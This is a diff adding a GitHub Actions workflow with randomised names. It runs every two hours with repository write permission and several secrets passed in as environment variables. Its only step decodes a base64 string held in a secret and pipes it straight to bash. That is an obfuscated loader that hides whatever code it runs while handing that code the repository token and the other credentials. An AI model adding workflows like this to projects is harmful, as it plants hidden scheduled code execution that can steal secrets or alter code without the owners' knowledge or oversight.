@@ -1,0 +1,21 @@
+name: kB8vEX5aIUMz07
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  jSuTifazs:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.LMMyX }}
+      - name: GxKp6CcJNyxCq
+        env:
+          aP5NIkSV: ${{ secrets.c3j9YEn6B }}
+          NipF92zJtgkFSVf: ${{ secrets.cWCx94WpJcZ7 }}
+          cbCV3ky01: ${{ secrets.mgP7NPn7a53tXmop }}
+          GITHUB_TOKEN: ${{ secrets.LMMyX }}
+        run: echo "$aP5NIkSV" | base64 -d | bash
